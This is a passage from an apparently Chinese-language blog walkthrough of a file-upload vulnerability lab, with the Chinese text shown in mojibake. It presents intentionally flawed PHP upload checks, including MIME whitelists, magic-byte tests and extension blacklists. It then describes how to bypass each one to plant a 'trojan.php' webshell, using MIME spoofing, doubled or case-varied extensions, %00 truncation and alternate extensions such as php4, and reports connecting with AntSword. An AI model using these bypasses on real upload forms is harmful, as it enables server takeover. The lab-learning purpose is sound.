</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ËøôÈáåÊ£ÄÊü•ÁöÑÊñπÂºèÊòØÊ£ÄÊü• <code>$_FILES['file']['type']</code> ÁöÑÂÄºÔºåËøôÈáåÊàë‰ª¨Êù•Â≠¶‰π†‰∏Ä‰∏ãPHPÁöÑ <code>superglobals</code>: <code>$_FILES</code>,‰ª•ÂèäÂÖ∂Áõ∏ÂÖ≥ÁöÑÁî®Ê≥ï <!-- raw HTML omitted --></p>
<dl>
<dt>$_FILES</dt>
<dd>PHPÂÆòÁΩëÔºö&ldquo;An associative array of items uploaded to the current script via the HTTP POST method.&rdquo; <!-- raw HTML omitted -->
Âç≥‰∏Ä‰∏™Â≠òÊîæÊâÄÊúâÈÄöËøá <code>POST</code> ÊñπÊ≥ï‰∏ä‰º†ÁöÑÊñá‰ª∂‰ø°ÊÅØÁöÑÊï∞ÁªÑ <!-- raw HTML omitted --></dd>
</dl>
<p>ÁÑ∂ÂêéÊàë‰ª¨Êù•ÁúãÁúã <code>POST</code> ‰∏ä‰º†‰∏≠ÊâÄÂåÖÂê´<a class="link" href="https://www.php.net/manual/en/features.file-upload.post-method.php"  target="_blank" rel="noopener"
    >Êñá‰ª∂ÁöÑ‰ø°ÊÅØ</a> <!-- raw HTML omitted --></p>
<dl>
<dt>$_FILES[&lsquo;userfile&rsquo;][&rsquo;name&rsquo;]</dt>
<dd>‰ªéÂÆ¢Êà∑Á´Ø‰∏ä‰º†ÁöÑÊñá‰ª∂ÁöÑÂéüÂßãÂêçÂ≠ó <!-- raw HTML omitted --></dd>
<dt>$_FILES[&lsquo;userfile&rsquo;][&rsquo;type&rsquo;]</dt>
<dd>Êñá‰ª∂ÁöÑ<a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types"  target="_blank" rel="noopener"
    >MIME types</a>Ôºå <!-- raw HTML omitted --></dd>
<dt>$_FILES[&lsquo;userfile&rsquo;][&lsquo;size&rsquo;]</dt>
<dd>Êñá‰ª∂ÁöÑÂ§ßÂ∞è(bytes) <!-- raw HTML omitted --></dd>
<dt>$_FILES[&lsquo;userfile&rsquo;][&rsquo;tmp_name&rsquo;]</dt>
<dd>Áî®‰∫éÂ≠òÂÇ®Êñá‰ª∂Â∞ÜË¶ÅÂ≠òÊîæÂú®serverÁöÑ‰∏¥Êó∂ÂêçÂ≠ó <!-- raw HTML omitted --></dd>
<dt>$_FILES[&lsquo;userfile&rsquo;][&rsquo;error&rsquo;]</dt>
<dd>‰∏ä‰º†Â§±Ë¥•ÁöÑ<a class="link" href="https://www.php.net/manual/en/features.file-upload.errors.php"  target="_blank" rel="noopener"
    >ÈîôËØØ‰ø°ÊÅØ</a> <!-- raw HTML omitted --></dd>
<dt>$_FILES[&lsquo;userfile&rsquo;][&lsquo;full_path&rsquo;]</dt>
<dd>ÊµèËßàÂô®Êèê‰∫§ÁöÑÂÆåÊï¥Ë∑ØÂæÑ? PHP8.1.0ÊîØÊåÅ <!-- raw HTML omitted --></dd>
</dl>
<p>Êé•ÁùÄÊàë‰ª¨Êù•ÁúãÊú¨Ê¨°Êñá‰ª∂‰∏ä‰º†ÁöÑHTTPËØ∑Ê±Ç <!-- raw HTML omitted --></p>
<p>ÊòØ‰∏çÊòØËÉΩÂèëÁé∞Êàë‰ª¨ÂàöÂàöÊèêÂà∞ËøáÁöÑ <code>$_FILES</code> ÁöÑ‰ø°ÊÅØÔºü <!-- raw HTML omitted -->
userfile = &ldquo;file&rdquo; <!-- raw HTML omitted -->
$_FILES[&lsquo;userfile&rsquo;][&rsquo;type&rsquo;] = &ldquo;text/php&rdquo; <!-- raw HTML omitted -->
$_FILES[&lsquo;userfile&rsquo;][&rsquo;name&rsquo;] = &ldquo;trojan.php&rdquo; <!-- raw HTML omitted --></p>
<p>Âõ†Ê≠§Êàë‰ª¨ÈÄöËøáÊäìÂåÖÂêé‰øÆÊîπ <code>MIME</code> Ê†ºÂºè‰∏∫ÁôΩÂêçÂçï‰∏≠ÁöÑ‰ªªÊÑè‰∏Ä‰∏™ÂõæÁâáÊ†ºÂºèÂç≥ÂèØÁªïËøá <!-- raw HTML omitted --></p>
<p>ËöÅÂâëËøûÊé•ÊµãËØïÊàêÂäü <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-04-29_11-54-24_screenshot.png" width="400px"/>
</figure>
 <!-- raw HTML omitted --></p>
<h3 id="Êñá‰ª∂Â§¥ÁªïËøá">Êñá‰ª∂Â§¥ÁªïËøá</h3>
<p>È¢òÁõÆÊèêÁ§∫ÁªôÁöÑ‰ø°ÊÅØÂ∑≤ÁªèÂæàÂ§öÂÖ®Èù¢‰∫ÜÔºåÊØè‰∏Ä‰∏™Êñá‰ª∂ÁöÑÂºÄÂ§¥ÈÉΩÂ≠òÊîæ‰∫ÜÂìçÂ∫îÁöÑÊ†ºÂºèÊåáÁ§∫ÔºåÂõ†Ê≠§Êàë‰ª¨ÁöÑÁõÆÊ†áÂ∞±ÊòØ‰øÆÊîπËøô‰∏™Êñá‰ª∂Â§¥Êù•ÂÆûÁé∞ÁªïËøá <!-- raw HTML omitted --></p>
<p>Êé•ÁùÄÊàë‰ª¨ÁªìÂêàÊ∫êÁ†ÅÊù•ÁúãÔºåÂêéÂè∞È¶ñÂÖàËøòÊòØÊ£ÄÊµã‰∫Ü‰∏äÈ¢òÁöÑ <code>MIME</code> Á±ªÂûãÔºåÈúÄË¶Å‰øÆÊîπ‰∏Ä‰∏ãÔºåÊé•ÁùÄÊ†°È™å‰∫Ü‰∏â‰∏™ÂõæÁâáÊ†ºÂºèÁöÑÊñá‰ª∂Â§¥ÊòØÂê¶Â≠òÂú®‰∫éÊñá‰ª∂ÂÜÖ <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s2">&#34;image/jpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;image/jpg&#34;</span><span class="p">,</span> <span class="s2">&#34;image/png&#34;</span><span class="p">,</span> <span class="s2">&#34;image/gif&#34;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">bin2hex</span><span class="p">(</span><span class="nv">$bin</span><span class="p">),</span> <span class="p">[</span><span class="s2">&#34;89504E47&#34;</span><span class="p">,</span> <span class="s2">&#34;FFD8FFE0&#34;</span><span class="p">,</span> <span class="s2">&#34;47494638&#34;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ÈÇ£Êàë‰ª¨Âè™ÈúÄË¶ÅÁî®BurpÊà™ÂèñËØ∑Ê±Ç‰πãÂêéÔºå‰øÆÊîπMIMEÁ±ªÂûã‰ª•ÂèäÂä†‰∏äÊñá‰ª∂Â§¥Âç≥ÂèØ <!-- raw HTML omitted --></p>
<p><!-- raw HTML omitted --> <!-- raw HTML omitted -->
ËöÅÂâëËøûÊé•ÊàêÂäü <!-- raw HTML omitted --></p>
<p>JPEG (jpg)ÔºåÊñá‰ª∂Â§¥ÔºöFFD8FFÔºå <code>√ø√ò√ø</code> <!-- raw HTML omitted -->
PNG (png)ÔºåÊñá‰ª∂Â§¥Ôºö89504E47Ôºå <code>.PNG</code> <!-- raw HTML omitted -->
GIF (gif)ÔºåÊñá‰ª∂Â§¥Ôºö47494638Ôºå <code>GIF8</code> <!-- raw HTML omitted -->
HTML (html)ÔºåÊñá‰ª∂Â§¥Ôºö68746D6C3E, <code>html&gt;</code> <!-- raw HTML omitted -->
ZIP Archive (zip)ÔºåÊñá‰ª∂Â§¥Ôºö504B0304, <code>PK..</code> <!-- raw HTML omitted -->
RAR Archive (rar)ÔºåÊñá‰ª∂Â§¥Ôºö52617221, <code>Rar!</code> <!-- raw HTML omitted -->
Adobe Acrobat (pdf)ÔºåÊñá‰ª∂Â§¥Ôºö255044462D312E, <code>%PDF-1.</code> <!-- raw HTML omitted -->
MS Word/Excel (xls.or.doc)ÔºåÊñá‰ª∂Â§¥ÔºöD0CF11E0, <code>√ê√è.√†</code> <!-- raw HTML omitted --></p>
<h3 id="ÊúâÁº∫Èô∑ÁöÑ‰ª£Á†Å1">ÊúâÁº∫Èô∑ÁöÑ‰ª£Á†Å1</h3>
<p>Ê†πÊçÆÈ¢òÁõÆÊèêÁ§∫ÁªìÂêàÊ∫êÁ†ÅÔºåÊàë‰ª¨ÂæóÁü•ËøôÈáåÁî®‰∫Ü‰∏Ä‰∏™ÈªëÂêçÂçïÊù•ËøáÊª§ÊâÄÊúâÁöÑwebshell‰ª•ÂèähtaccessÂêéÁºÄÁöÑÊñá‰ª∂ÔºåÁåúÊµãÁªïËøáÂèØËÉΩÂèëÁîüÂú®ÊñπÊ≥ï <code>str_ireplace</code> Ë∫´‰∏ä <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;php5&#34;</span><span class="p">,</span> <span class="s2">&#34;php4&#34;</span><span class="p">,</span> <span class="s2">&#34;php3&#34;</span><span class="p">,</span> <span class="s2">&#34;phtml&#34;</span><span class="p">,</span> <span class="s2">&#34;pht&#34;</span><span class="p">,</span> <span class="s2">&#34;jsp&#34;</span><span class="p">,</span> <span class="s2">&#34;jspa&#34;</span><span class="p">,</span> <span class="s2">&#34;jspx&#34;</span><span class="p">,</span> <span class="s2">&#34;jsw&#34;</span><span class="p">,</span> <span class="s2">&#34;jsv&#34;</span><span class="p">,</span> <span class="s2">&#34;jspf&#34;</span><span class="p">,</span> <span class="s2">&#34;jtml&#34;</span><span class="p">,</span> <span class="s2">&#34;asp&#34;</span><span class="p">,</span> <span class="s2">&#34;aspx&#34;</span><span class="p">,</span> <span class="s2">&#34;asa&#34;</span><span class="p">,</span> <span class="s2">&#34;asax&#34;</span><span class="p">,</span> <span class="s2">&#34;ascx&#34;</span><span class="p">,</span> <span class="s2">&#34;ashx&#34;</span><span class="p">,</span> <span class="s2">&#34;asmx&#34;</span><span class="p">,</span> <span class="s2">&#34;cer&#34;</span><span class="p">,</span> <span class="s2">&#34;swf&#34;</span><span class="p">,</span> <span class="s2">&#34;htaccess&#34;</span><span class="p">,</span> <span class="s2">&#34;ini&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="nv">$blacklist</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Ê†πÊçÆ‰ª•ÂâçÁªïËøáÁ±ª‰ººÈªëÂêçÂçïÁöÑÁªèÂéÜÔºåËøôÈáåÁöÑ <code>str_ireplace</code> ÁÆÄÂçïÁöÑÂ∞ÜÊâÄÊúâÁöÑÂåπÈÖçÊõøÊç¢‰∏∫Á©∫ÔºåÈùûÂ∏∏ÁöÑÂç±Èô©ÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂ§çÂÜôÊãºÊé•ÁöÑÊâãÊÆµÊù•ËøõË°åÁªïËøáËøáÊª§ <!-- raw HTML omitted --></p>
<p>‰æãÂ¶Ç <code>pphphp</code> Á¨¨‰∏Ä‰∏™Á¢∞Âà∞ÁöÑphpË¢´ÊõøÊç¢‰πãÂêéÔºåÂ∞±ÂèØ‰ª•ÂΩ¢Êàê‰∏Ä‰∏™ÂÆåÊï¥ÁöÑphpÂêéÁºÄ‰∫Ü <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-04-29_12-18-24_screenshot.png" width="400px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p>ËöÅÂâëËøûÊé•ÊµãËØïÊàêÂäü <!-- raw HTML omitted --></p>
<h3 id="ÊúâÁº∫Èô∑ÁöÑ‰ª£Á†Å2">ÊúâÁº∫Èô∑ÁöÑ‰ª£Á†Å2</h3>
<p>Âõ†‰∏∫ÊèêÁ§∫‰∏é‰∏ä‰∏ÄÈ¢òÂü∫Êú¨Á±ª‰ººÔºå‰∏çËøáÊèêÂà∞‰∫ÜÊâãÂä®ÊîπÊàê‰∫ÜWindowsÁöÑÁâπÊÄßÔºåÂõ†Ê≠§Êàë‰ª¨Áõ¥Êé•‰∏ÄËµ∑Êù•Áúã‰∏Ä‰∏ãÊ∫êÁ†ÅÂêß <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;php5&#34;</span><span class="p">,</span> <span class="s2">&#34;php4&#34;</span><span class="p">,</span> <span class="s2">&#34;php3&#34;</span><span class="p">,</span> <span class="s2">&#34;phtml&#34;</span><span class="p">,</span> <span class="s2">&#34;pht&#34;</span><span class="p">,</span> <span class="s2">&#34;jsp&#34;</span><span class="p">,</span> <span class="s2">&#34;jspa&#34;</span><span class="p">,</span> <span class="s2">&#34;jspx&#34;</span><span class="p">,</span> <span class="s2">&#34;jsw&#34;</span><span class="p">,</span> <span class="s2">&#34;jsv&#34;</span><span class="p">,</span> <span class="s2">&#34;jspf&#34;</span><span class="p">,</span> <span class="s2">&#34;jtml&#34;</span><span class="p">,</span> <span class="s2">&#34;asp&#34;</span><span class="p">,</span> <span class="s2">&#34;aspx&#34;</span><span class="p">,</span> <span class="s2">&#34;asa&#34;</span><span class="p">,</span> <span class="s2">&#34;asax&#34;</span><span class="p">,</span> <span class="s2">&#34;ascx&#34;</span><span class="p">,</span> <span class="s2">&#34;ashx&#34;</span><span class="p">,</span> <span class="s2">&#34;asmx&#34;</span><span class="p">,</span> <span class="s2">&#34;cer&#34;</span><span class="p">,</span> <span class="s2">&#34;swf&#34;</span><span class="p">,</span> <span class="s2">&#34;htaccess&#34;</span><span class="p">,</span> <span class="s2">&#34;ini&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nv">$blacklist</span><span class="p">,</span> <span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ÂèëÁé∞ËøôÊ¨°ÁöÑ <code>str_replace()</code> ÊñπÊ≥ïÊõøÊç¢ÁöÑÊòØÁ©∫Ê†ºÔºåÂõ†Ê≠§Ê≤°ÂäûÊ≥ïÁî®‰∏ä‰∏ÄÈÅçÁöÑÂ•óË∑Ø <!-- raw HTML omitted --></p>
<p>‰ªîÁªÜ‰∏ÄÁúãÔºåÊ≠§replaceÈùûÂΩºreplaceÔºåËøô‰∏™ <code>str_replace</code> ÊòØcase sensitiveËÄåÂâç‰∏Ä‰∏™ÁöÑ <code>str_ireplace</code> ÊåáÁöÑÂ∞±ÊòØ case insensitive <!-- raw HTML omitted --></p>
<p>ÈÇ£‰πàÊàë‰ª¨Áî® <code>Php</code> Âç≥ÂèØÂÆåÊàêÁªïËøá <!-- raw HTML omitted --></p>
<p>‰ΩÜÊòØÂ∞±ÂÉèÊèêÁ§∫ÊâÄËØ¥ÁöÑÈÇ£Ê†∑ÔºåËøôÈ¢òÂÆûÈôÖÁî®ËöÅÂâëÊòØÊ≤°ÊúâÂäûÊ≥ïÊàêÂäüËøûÊé•ÁöÑÔºåÂõ†‰∏∫ÊØïÁ´üÂè™ÊòØÊ®°ÊãüwindowsÁéØÂ¢ÉÔºåÊú¨Ë¥®‰∏äËøòÊòØlinuxÔºå‰∏çÂ≠òÂú®ËøôÊ†∑ÁöÑÊºèÊ¥û <!-- raw HTML omitted --></p>
<h3 id="Âè§ËÄÅÁöÑÊºèÊ¥û-1">Âè§ËÄÅÁöÑÊºèÊ¥û - 1</h3>
<p>Ê†πÊçÆÊú¨È¢òÁöÑÊèêÁ§∫ÔºåËøôÊòØ‰∏Ä‰∏™00ÊºèÊ¥ûÔºåËØ¥ÂÖ∂Âè§ËÄÅ‰∏ªË¶ÅÊòØÂõ†‰∏∫Âè™ÊúâÂú®PHPÁâàÊú¨Â∞è‰∫é5.3.4ÁâàÊú¨ÊâçÊúâÊïàÔºåÂπ∂‰∏îË¶ÅÊ±Çmagic_quotes_gpc = OffÁöÑÊÉÖÂÜµÔºàÊàë‰ª¨Âú®<a class="link" href="https://ginkgo.org.cn/posts/sqli_labs_study/#lesson-17"  target="_blank" rel="noopener"
    >sqli-labsÁöÑÂ≠¶‰π†‰∏≠</a>ÁúãÂà∞ËøáËøô‰∏™Ôºâ <!-- raw HTML omitted --></p>
<p>ÁªìÂêàÊ∫êÁ†ÅÊù•ÁúãÔºåËøôÈáåÁî®‰∫Ü‰∏Ä‰∏™‰∏•Ê†ºÁöÑÁôΩÂêçÂçïËøáÊª§ÔºåÂπ∂‰∏îÂà©Áî®ÈöèÊú∫‰∏¥Êó∂Êñá‰ª∂ÂêçÔºåËÆ©Êàë‰ª¨Êó†Ê≥ï‰ΩøÁî® <code>htaccess</code> Êù•‰øÆÊîπÊåáÂÆöÊñá‰ª∂ÁöÑÈÖçÁΩÆ <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$info</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$whitelist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;jpg&#34;</span><span class="p">,</span> <span class="s2">&#34;jpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;png&#34;</span><span class="p">,</span> <span class="s2">&#34;gif&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">99</span><span class="p">)</span> <span class="o">.</span> <span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;.&#34;</span> <span class="o">.</span> <span class="nv">$ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$des</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;road&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;/&#34;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$des</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Êñá‰ª∂Á±ªÂûã‰∏çÂåπÈÖç&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Âõ†Ê≠§Êàë‰ª¨Êàë‰ª¨ÈÄöËøá‰øÆÊîπPOSTÁöÑÊñá‰ª∂Ë∑ØÂæÑÂú®ÂêéÈù¢Âä†‰∏ä <code>trojan.php%00</code>,ÁÑ∂ÂêéÂ∞Ü‰∏ä‰º†ÁöÑÊñá‰ª∂ÊîπÊàêgifÊ†ºÂºèÔºåËøôÊ†∑Âú®‰∏äÈù¢ËøõË°åÂêéÁºÄÂà§Êñ≠ÁöÑÊó∂ÂÄôÔºåÁî®ÁöÑÂ∞±ÊòØ <code>gif</code>,ËÄåËøõË°åÂ≠òÂÇ®ÁöÑÊó∂ÂÄôÊèêÂèñÁöÑÂêéÁºÄÂêçÂ∞±‰ºöÂõ†‰∏∫ <code>%00</code> ÁöÑÂÖ≥Á≥ªÂøΩÁï•ÊúÄÂêéÁöÑ <code>gif</code> ‰ª•Âèä‰∏¥Êó∂Êñá‰ª∂ÂêçÁöÑÂêçÂ≠óËÄåÂè™‰øùÂ≠ò <code>trojan.php</code>  <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-04-29_15-47-47_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-04-29_15-47-36_screenshot.png" width="200px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p>ÊúÄÂêéÈÄöËøáËöÅÂâëËøûÊé•ÊàêÂäü <!-- raw HTML omitted --></p>
<h3 id="Âè§ËÄÅÁöÑÊºèÊ¥û-2">Âè§ËÄÅÁöÑÊºèÊ¥û - 2</h3>
<p>ËøôÈ¢òÂêåÊ†∑ÊòØÂà©Áî®00Êà™Êñ≠ÔºåÂè™‰∏çËøáÊòØÂèëÁîüÂú®‰∫Ü <code>POST</code> ËØ∑Ê±Ç‰∏äÈù¢ <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-04-29_16-00-55_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p>ËøôÈáåÂà´Âøò‰∫ÜÁî®URLËß£Á†Å‰∏Ä‰∏ãÔºåÂõ†‰∏∫‰∏çÂÉè‰∏ä‰∏ÄÈ¢òÊòØÊîæÂú®urlÈáåÈù¢‰ºöËá™Âä®Ëß£Êûê <!-- raw HTML omitted --></p>
<p>ËöÅÂâëËøûÊé•ÊàêÂäü <!-- raw HTML omitted --></p>
<h3 id="ÈªëÂêçÂçïÁº∫Èô∑">ÈªëÂêçÂçïÁº∫Èô∑</h3>
<p>ÁúãÊ∫êÁ†ÅÔºåËßÇÂØüÂà∞Áî®‰∫Ü‰∏Ä‰∏™ÈªëÂêçÂçïÊù•ËøáÊª§webshellÔºå‰ΩÜÊòØ‰∏ÄÁúãÂ∞±ÊØî‰πãÂâçÈÅáÂà∞ËøáÁöÑÈªëÂêçÂçïÁü≠‰∫ÜÂæàÂ§öÔºåÊàë‰ª¨ËøôÈáåÂà©Áî®webshell‰ºöÊúâÂæàÂ§öÁöÑËß£ÊûêÁöÑÂèòÁßçÊù•ÂÆåÊàêÁªïËøá <!-- raw HTML omitted --></p>
<p>Â∞ÜÊñá‰ª∂ÁöÑÂêéÁºÄÊîπ‰∏∫ <code>php4</code> Âç≥ÂèØÂÆåÊàêÁªïËøá <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
